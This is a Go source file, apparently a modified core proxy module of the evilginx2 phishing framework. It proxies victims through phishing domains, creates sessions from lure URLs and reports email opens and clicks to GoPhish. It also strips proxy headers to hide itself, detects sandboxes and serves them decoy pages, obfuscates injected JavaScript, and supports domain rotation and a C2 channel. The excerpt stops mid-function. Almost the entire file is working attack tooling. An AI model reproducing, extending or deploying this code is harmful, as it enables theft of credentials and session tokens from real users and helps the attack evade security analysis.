/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bufio"
	"bytes"
	cryptorand "crypto/rand"
	"crypto/rc4"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"

	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
	"github.com/inconshreveable/go-vhost"
	http_dialer "github.com/mwitkow/go-http-dialer"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	HOME_DIR = ".evilginx"
)

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second
)

// original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	wl                *Whitelist
	gophish           *GoPhish
	telegram          *TelegramBot
	botguard          *BotGuard
	mlDetector        *MLBotDetector
	ja3Fingerprinter  *JA3Fingerprinter
	tlsInterceptor    *TLSInterceptor
	captchaManager    *CaptchaManager
	domainRotation    *DomainRotationManager
	trafficShaper     *TrafficShaper
	sandboxDetector   *SandboxDetector
	c2Channel         *C2Channel
	polymorphicEngine *PolymorphicEngine
	obfuscator        *JSObfuscator
	sniListener       net.Listener
	isRunning         bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
	session_mtx       sync.Mutex
}

type ProxySession struct {
	SessionId    string
	Created      bool
	PhishDomain  string
	PhishletName string
	Index        int
}

// set the value of the specified key in the JSON body
func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return nil, err
	}
	data[key] = value
	newBody, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}
	return newBody, nil
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, wl *Whitelist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		wl:                wl,
		gophish:           NewGoPhish(),
		telegram:          NewTelegramBot(),
		botguard:          NewBotGuard(cfg),
		mlDetector:        nil, // Will be initialized based on config
		ja3Fingerprinter:  NewJA3Fingerprinter(),
		tlsInterceptor:    nil, // Will be initialized with JA3 fingerprinter
		captchaManager:    NewCaptchaManager(cfg.GetCaptchaConfig()),
		domainRotation:    nil, // Will be initialized based on config
		trafficShaper:     nil, // Will be initialized based on config
		sandboxDetector:   nil, // Will be initialized based on config
		c2Channel:         nil, // Will be initialized based on config
		polymorphicEngine: nil, // Will be initialized based on config
		obfuscator:        NewJSObfuscator(cfg),
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		sessions:          make(map[string]*Session),
		sids:              make(map[string]int),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
		cookieName:        GenRandomString(4),
	}

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	if cfg.proxyConfig.Enabled {
		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
		}
	}

	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	// Initialize ML detector if enabled in config
	if cfg.IsMLDetectorEnabled() {
		mlConfig := cfg.GetMLDetectorConfig()
		p.mlDetector = NewMLBotDetector(mlConfig.Threshold)
		log.Info("ML bot detector enabled with threshold: %.2f", mlConfig.Threshold)
	}

	// Initialize TLS interceptor
	p.tlsInterceptor = NewTLSInterceptor(p.ja3Fingerprinter)
	log.Info("JA3/JA3S TLS fingerprinting enabled with %d known bot signatures", p.ja3Fingerprinter.GetKnownBotCount())

	// Initialize domain rotation if enabled
	if cfg.GetDomainRotationConfig() != nil && cfg.GetDomainRotationConfig().Enabled {
		p.domainRotation = NewDomainRotationManager(cfg.GetDomainRotationConfig(), p.crt_db)
		log.Info("Domain rotation system initialized")
	}

	// Initialize traffic shaper if enabled
	if cfg.GetTrafficShapingConfig() != nil && cfg.GetTrafficShapingConfig().Enabled {
		p.trafficShaper = NewTrafficShaper(cfg.GetTrafficShapingConfig())
		log.Info("Traffic shaping system initialized")
	}

	// Initialize sandbox detector if enabled
	if cfg.GetSandboxDetectionConfig() != nil && cfg.GetSandboxDetectionConfig().Enabled {
		p.sandboxDetector = NewSandboxDetector(cfg.GetSandboxDetectionConfig(), p.obfuscator)
		log.Info("Sandbox detection system initialized")
	}

	// Initialize C2 channel if enabled
	if cfg.GetC2ChannelConfig() != nil && cfg.GetC2ChannelConfig().Enabled {
		c2, err := NewC2Channel(cfg.GetC2ChannelConfig(), db)
		if err != nil {
			log.Error("Failed to initialize C2 channel: %v", err)
		} else {
			p.c2Channel = c2
			log.Info("C2 channel initialized with %s transport", cfg.GetC2ChannelConfig().Transport)
		}
	}

	// Initialize polymorphic engine if enabled
	if cfg.GetPolymorphicConfig() != nil && cfg.GetPolymorphicConfig().Enabled {
		p.polymorphicEngine = NewPolymorphicEngine(cfg.GetPolymorphicConfig())
		log.Info("Polymorphic JavaScript engine initialized with %s mutation level", cfg.GetPolymorphicConfig().MutationLevel)
	}

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				SessionId:    "",
				Created:      false,
				PhishDomain:  "",
				PhishletName: "",
				Index:        -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			// handle ip blacklist
			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]

			// handle proxy headers
			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
			for _, h := range proxyHeaders {
				origin_ip := req.Header.Get(h)
				if origin_ip != "" {
					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
					break
				}
			}

			// Check traffic shaping before processing request
			if p.trafficShaper != nil {
				allowed, reason := p.trafficShaper.ShouldAllowRequest(req, from_ip)
				if !allowed {
					log.Warning("[Traffic Shaper] Request blocked from %s: %s", from_ip, reason)
					// Return 429 Too Many Requests
					return req, goproxy.NewResponse(req, "text/plain", http.StatusTooManyRequests, reason)
				}
			}

			// Check for sandbox/VM environment
			if p.sandboxDetector != nil {
				detection := p.sandboxDetector.Detect(req, from_ip)
				if detection.IsSandbox {
					log.Warning("[Sandbox Detector] %s environment detected from %s (confidence: %.2f): %v",
						detection.DetectedType, from_ip, detection.Confidence, detection.Reasons)
					
					// Take action based on configuration
					switch p.cfg.GetSandboxDetectionConfig().ActionOnDetection {
					case "block":
						return req, goproxy.NewResponse(req, "text/plain", http.StatusForbidden, "Access denied")
					case "redirect":
						redirectURL := p.cfg.GetSandboxDetectionConfig().RedirectURL
						if redirectURL == "" {
							redirectURL = "https://www.google.com"
						}
						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
						resp.Header.Set("Location", redirectURL)
						return req, resp
					case "honeypot":
						honeypotResponse := p.cfg.GetSandboxDetectionConfig().HoneypotResponse
						if honeypotResponse == "" {
							honeypotResponse = "<html><body><h1>Welcome</h1><p>This is a legitimate website.</p></body></html>"
						}
						return req, goproxy.NewResponse(req, "text/html", http.StatusOK, honeypotResponse)
					}
				}
			}

			// Handle API endpoints
			if strings.HasPrefix(req.URL.Path, "/api/legacy/cloudflare/worker") {
				return p.handleCloudflareWorkerAPI(req)
			}
			
			// Handle behavior data collection endpoint
			if strings.HasPrefix(req.URL.Path, "/api/behavior/") {
				return p.handleBehaviorData(req)
			}
			
			// Handle CAPTCHA verification endpoint
			if strings.HasPrefix(req.URL.Path, "/verify/captcha") {
				return p.handleCaptchaVerification(req)
			}
			
			// Handle sandbox detection endpoint
			if strings.HasPrefix(req.URL.Path, "/api/sandbox-detection") {
				return p.handleSandboxDetection(req)
			}

			// Remove Cloudflare-specific headers that could expose proxy
			cfHeaders := []string{
				"CF-Connecting-IP",
				"CF-Ray",
				"CF-Visitor",
				"CF-Request-ID",
				"CF-IPCountry",
				"CF-Visitor-Country",
				"CF-EW-Via",
				"CF-EW-Edge",
				"CF-EW-Origin",
			}
			for _, h := range cfHeaders {
				req.Header.Del(h)
			}

			// Remove proxy fingerprinting headers
			proxyFingerprintHeaders := []string{
				"X-Forwarded-Proto",
				"X-Forwarded-Host",
				"X-Forwarded-Port",
				"X-Forwarded-Server",
				"Via",
				"X-Real-IP",
				"Forwarded",
				"X-ProxyUser-Ip",
				"X-Original-URL",
				"X-Rewrite-URL",
			}
			for _, h := range proxyFingerprintHeaders {
				req.Header.Del(h)
			}

			// Normalize User-Agent to avoid detection patterns
			if ua := req.Header.Get("User-Agent"); ua != "" {
				// Remove suspicious UA patterns
				ua = strings.ReplaceAll(ua, "Cloudflare-Workers", "")
				ua = strings.ReplaceAll(ua, "Bot", "")
				req.Header.Set("User-Agent", strings.TrimSpace(ua))
			}

			// Add realistic Accept headers if missing
			if req.Header.Get("Accept") == "" {
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
			}

			if req.Header.Get("Accept-Language") == "" {
				req.Header.Set("Accept-Language", "en-US,en;q=0.9")
			}

			if req.Header.Get("Accept-Encoding") == "" {
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			}

			// Add Sec-Fetch-* headers to appear as browser navigation
			if req.Header.Get("Sec-Fetch-Dest") == "" {
				req.Header.Set("Sec-Fetch-Dest", "document")
			}
			if req.Header.Get("Sec-Fetch-Mode") == "" {
				req.Header.Set("Sec-Fetch-Mode", "navigate")
			}
			if req.Header.Get("Sec-Fetch-Site") == "" {
				req.Header.Set("Sec-Fetch-Site", "none")
			}
			if req.Header.Get("Sec-Fetch-User") == "" {
				req.Header.Set("Sec-Fetch-User", "?1")
			}

			// Add DNT header randomly (50% chance) for realism
			if rand.Intn(2) == 0 {
				req.Header.Set("DNT", "1")
			}

			// Randomize connection header
			connections := []string{"keep-alive", "close"}
			req.Header.Set("Connection", connections[rand.Intn(len(connections))])

			// Check IP whitelist if enabled
			if p.cfg.IsWhitelistEnabled() && p.wl != nil {
				if !p.wl.IsWhitelisted(from_ip) {
					if p.wl.IsVerbose() {
						log.Warning("whitelist: request from ip address '%s' was blocked (not in whitelist)", from_ip)
					}
					return p.blockRequest(req)
				}
			}

			if p.cfg.GetBlacklistMode() != "off" {
				if p.bl.IsBlacklisted(from_ip) {
					if p.bl.IsVerbose() {
						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
					}
					return p.blockRequest(req)
				}
				if p.cfg.GetBlacklistMode() == "all" {
					if !p.bl.IsWhitelisted(from_ip) {
						err := p.bl.AddIP(from_ip)
						if p.bl.IsVerbose() {
							if err != nil {
								log.Error("blacklist: %s", err)
							} else {
								log.Warning("blacklisted ip address: %s", from_ip)
							}
						}
					}

					return p.blockRequest(req)
				}
			}

			// ML-based bot detection (primary)
			if p.mlDetector != nil && !p.developer {
				// Generate client ID for tracking
				clientID := p.getClientIdentifier(req)
				
				// Extract features
				var tlsState *tls.ConnectionState
				if ctx.Resp != nil && ctx.Resp.TLS != nil {
					tlsState = ctx.Resp.TLS
				}
				
				features := p.mlDetector.featureExtractor.ExtractRequestFeatures(req, tlsState, clientID)
				
				// Check JA3 fingerprint
				if p.tlsInterceptor != nil {
					ja3Result := p.tlsInterceptor.GetConnectionJA3(req.RemoteAddr)
					if ja3Result != nil {
						features.JA3Hash = ja3Result.JA3Hash
						if ja3Result.IsBot {
							log.Warning("[JA3] Known bot detected: %s from %s", ja3Result.BotName, from_ip)
						}
					}
				}
				
				// Run ML detection
				mlResult, err := p.mlDetector.Detect(features, clientID)
				if err == nil && mlResult.IsBot {
					log.Warning("[ML Detector] Bot detected (confidence: %.1f%%): %s %s [%s]",
						mlResult.Confidence*100, req.Method, req.URL.String(), from_ip)
					log.Debug("[ML Detector] Reasons: %v", mlResult.Explanation)
					
					// Check if we should spoof content or block
					if p.cfg.GetBotguardConfig() != nil && p.cfg.GetBotguardConfig().SpoofURL != "" {
						// Use BotGuard's spoof response mechanism
						if p.botguard != nil {
							spoofResp := p.botguard.GetSpoofResponse(req)
							return req, goproxy.NewResponse(req, "text/html", spoofResp.StatusCode, "")
						}
					}
					return p.blockRequest(req)
				}
			}

			// Legacy BotGuard detection (fallback)
			if p.botguard != nil && !p.developer && p.mlDetector == nil {
				// Get TLS state from context if available
				var tlsState *tls.ConnectionState
				if ctx.Resp != nil && ctx.Resp.TLS != nil {
					tlsState = ctx.Resp.TLS
				}

				_, isBot := p.botguard.AnalyzeRequest(req, tlsState)
				if isBot {
					// Check if we should spoof content or block
					if p.cfg.GetBotguardConfig() != nil && p.cfg.GetBotguardConfig().SpoofURL != "" {
						log.Warning("[botguard] bot detected, spoofing content: %s %s [%s]",
							req.Method, req.URL.String(), from_ip)

						// Return spoofed content
						spoofResp := p.botguard.GetSpoofResponse(req)
						return req, goproxy.NewResponse(req, "text/html", spoofResp.StatusCode, "")
					} else {
						log.Warning("[botguard] bot detected, blocking: %s %s [%s]",
							req.Method, req.URL.String(), from_ip)
						return p.blockRequest(req)
					}
				}
			}

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			o_host := req.Host
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
				//req_path += "?" + req.URL.RawQuery
			}

			pl := p.getPhishletByPhishHost(req.Host)
			remote_addr := from_ip

			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")

			if js_inject_re.MatchString(req.URL.Path) {
				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 3 {
					session_id := ra[1]
					js_id := ra[2]
					if strings.HasSuffix(js_id, ".js") {
						js_id = js_id[:len(js_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							var js_params *map[string]string = nil
							js_params = &s.Params

							script, err := pl.GetScriptInjectById(js_id, js_params)
							if err == nil {
								// Apply obfuscation if enabled
								if p.cfg.GetJSObfuscationConfig() != nil && p.cfg.GetJSObfuscationConfig().Enabled {
									level := ObfuscationLevel(p.cfg.GetJSObfuscationConfig().Level)
									obfuscatedScript, obfErr := p.obfuscator.ObfuscateScript(script, level)
									if obfErr == nil {
										d_body += obfuscatedScript + "\n\n"
									} else {
										log.Warning("js_inject: obfuscation failed: %v", obfErr)
										d_body += script + "\n\n"
									}
								} else {
									d_body += script + "\n\n"
								}
							} else {
								log.Warning("js_inject: script not found: '%s'", js_id)
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js_inject: session not found: '%s'", session_id)
						}
					}
				}
			} else if redir_re.MatchString(req.URL.Path) {
				ra := redir_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 2 {
					session_id := ra[1]
					if strings.HasSuffix(session_id, ".js") {
						// respond with injected javascript
						session_id = session_id[:len(session_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							if !s.IsDone {
								if s.RedirectURL != "" {
									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)

									// Apply obfuscation if enabled
									if p.cfg.GetJSObfuscationConfig() != nil && p.cfg.GetJSObfuscationConfig().Enabled {
										level := ObfuscationLevel(p.cfg.GetJSObfuscationConfig().Level)
										obfuscatedScript, obfErr := p.obfuscator.ObfuscateScript(dynamic_redirect_js, level)
										if obfErr == nil {
											d_body += obfuscatedScript + "\n\n"
										} else {
											log.Warning("js: obfuscation failed: %v", obfErr)
											d_body += dynamic_redirect_js + "\n\n"
										}
									} else {
										d_body += dynamic_redirect_js + "\n\n"
									}
								}
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js: session not found: '%s'", session_id)
						}
					} else {
						if _, ok := p.sessions[session_id]; ok {
							redirect_url, ok := p.waitForRedirectUrl(session_id)
							if ok {
								type ResponseRedirectUrl struct {
									RedirectUrl string `json:"redirect_url"`
								}
								d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
								if err == nil {
									s_index, _ := p.sids[session_id]
									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
									return req, resp
								}
							}
							resp := goproxy.NewResponse(req, "application/json", 408, "")
							return req, resp
						} else {
							log.Warning("api: session not found: '%s'", session_id)
						}
					}
				}
			}

			phishDomain, phished := p.getPhishDomain(req.Host)
			if phished {
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
					ps.PhishletName = pl_name
				}
				session_cookie := getSessionCookieName(pl_name, p.cookieName)

				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						log.Debug("triggered lure for path '%s'", req_path)
					}

					var create_session bool = true
					var ok bool = false
					sc, err := req.Cookie(session_cookie)
					if err == nil {
						ps.Index, ok = p.sids[sc.Value]
						if ok {
							create_session = false
							ps.SessionId = sc.Value
							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
						} else {
							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
							// not a lure path and IP is whitelisted

							// TODO: allow only retrieval of static content, without setting session ID

							create_session = false
							req_ok = true
							/*
								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
								if ok {
									create_session = false
									ps.Index, ok = p.sids[ps.SessionId]
								} else {
									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
								}*/
						}
					}

					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
						// session cookie not found
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								// check if lure is not paused
								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
									return p.blockRequest(req)
								}

								// check if lure user-agent filter is triggered
								if len(l.UserAgentFilter) > 0 {
									re, err := regexp.Compile(l.UserAgentFilter)
									if err == nil {
										if !re.MatchString(req.UserAgent()) {
											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

											if p.cfg.GetBlacklistMode() == "unauth" {
												if !p.bl.IsWhitelisted(from_ip) {
													err := p.bl.AddIP(from_ip)
													if p.bl.IsVerbose() {
														if err != nil {
															log.Error("blacklist: %s", err)
														} else {
															log.Warning("blacklisted ip address: %s", from_ip)
														}
													}
												}
											}
											return p.blockRequest(req)
										}
									} else {
										log.Error("lures: user-agent filter regexp is invalid: %v", err)
									}
								}

								session, err := NewSession(pl.Name)
								if err == nil {
									// set params from url arguments
									p.extractParams(session, req.URL)

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										if trackParam, ok := session.Params["o"]; ok {
											if trackParam == "track" {
												// gophish email tracker image
												rid, ok := session.Params["rid"]
												if ok && rid != "" {
													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
													if err != nil {
														log.Error("gophish: %s", err)
													}
													return p.trackerImage(req)
												}
											}
										}
									}

									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										rid, ok := session.Params["rid"]
										if ok && rid != "" {
											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
											if err != nil {
												log.Error("gophish: %s", err)
											}
										}
									}

									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									}

									session.RemoteAddr = remote_addr
									session.UserAgent = req.Header.Get("User-Agent")
									session.RedirectURL = pl.RedirectUrl
									if l.RedirectUrl != "" {
										session.RedirectURL = l.RedirectUrl
									}
									if session.RedirectURL != "" {
										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
									}
									session.PhishLure = l
									log.Debug("redirect URL (lure): %s", session.RedirectURL)

									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)

									req_ok = true
								}
							} else {
								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

								if p.cfg.GetBlacklistMode() == "unauth" {
									if !p.bl.IsWhitelisted(from_ip) {
										err := p.bl.AddIP(from_ip)
										if p.bl.IsVerbose() {
											if err != nil {
												log.Error("blacklist: %s", err)
											} else {
												log.Warning("blacklisted ip address: %s", from_ip)
											}
										}
									}
								}
								return p.blockRequest(req)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						return p.blockRequest(req)
					}
				}
				req.Header.Set(p.getHomeDir(), o_host)

				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
						if err == nil {
							// show html redirector if it is set for the current lure
							if l.Redirector != "" {
								if !p.isForwarderUrl(req.URL) {
									if s.RedirectorName == "" {
										s.RedirectorName = l.Redirector
										s.LureDirPath = req_path
									}

									t_dir := l.Redirector
									if !filepath.IsAbs(t_dir) {
										redirectors_dir := p.cfg.GetRedirectorsDir()
										t_dir = filepath.Join(redirectors_dir, t_dir)
									}

									index_path1 := filepath.Join(t_dir, "index.html")
									index_path2 := filepath.Join(t_dir, "index.htm")
									index_found := ""
									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
										index_found = index_path1
									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
										index_found = index_path2
									}

									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
										html, err := ioutil.ReadFile(index_found)
										if err == nil {

											html = p.injectOgHeaders(l, html)

											body := string(html)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html redirector response")
											}
										} else {
											log.Error("lure: failed to read redirector file: %s", err)
										}

									} else {
										log.Error("lure: redirector file does not exist: %s", index_found)
									}
								}
							}
						} else if s.RedirectorName != "" {
							// session has already triggered a lure redirector - see if there are any files requested by the redirector

							rel_parts := []string{}
							req_path_parts := strings.Split(req_path, "/")
							lure_path_parts := strings.Split(s.LureDirPath, "/")

							for n, dname := range req_path_parts {
								if len(dname) > 0 {
									path_add := true
									if n < len(lure_path_parts) {
										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
										if req_path_parts[n] == lure_path_parts[n] {
											path_add = false
										}
									}
									if path_add {
										rel_parts = append(rel_parts, req_path_parts[n])
									}
								}

							}
							rel_path := filepath.Join(rel_parts...)
